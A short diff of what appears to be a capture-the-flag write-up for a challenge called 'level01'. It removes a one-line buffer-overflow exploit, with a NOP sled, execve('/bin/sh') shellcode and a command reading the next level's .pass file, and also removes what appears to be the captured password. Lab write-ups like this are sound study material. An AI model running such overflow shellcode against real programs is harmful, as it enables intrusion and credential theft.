@@ -1,8 +1,3 @@
-( echo "dat_wil" ; python -c 'print("A" * 80 + "\xae\xde\xff\xff")' ; echo "cat /home/users/level02/.pass" ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level01
-
-PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
-
-
 # level01
 
 The executable prompts for a username and a password. A wrong username kicks us out, but no matter the password, nothing interesting happens.
